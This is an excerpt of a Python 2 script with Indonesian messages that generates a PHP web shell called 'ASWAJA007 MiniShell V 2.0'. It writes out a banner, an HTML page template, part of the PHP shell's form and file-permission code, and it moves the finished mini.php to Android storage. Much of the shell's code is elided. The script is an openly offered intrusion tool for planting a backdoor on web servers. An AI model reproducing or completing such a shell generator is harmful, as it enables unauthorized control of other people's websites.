...
\___ \| |_| |  _| | |   | |
 ___) |  _  | |___| |___| |___
|____/|_| |_|_____|_____|_____| \033[31mMINI\033[0m"""
...
print GG+"<=======================================>"
print GG+"Created The Mini Shell !"
...
messagescript1 = """<h1><center> minishell</center></h1>
...
<title>ASWAJA007 MiniShell V 2.0</title>
<style>
body{
    font-family: "Arial", cursive;
    background-image:url("https://s1.postimg.org/1en08sd61b/Black-_Wallpaper-_HD.jpg");
	color:white;
...
messagescript2 = """echo '<form method="POST">
...
echo '<br /><center>ASWAJA007 MiniShell Shell Version <font color="red">2.0</font></center>
</BODY>
</HTML>';
function perms($file){
...
print GG+"Selesai !"
os.system("mv mini.php /storage/emulated/0")
print CC+"Shell Mu \033[0m(mini.php)\033[36mBerada diluar folder 'penyimpanan internal' !"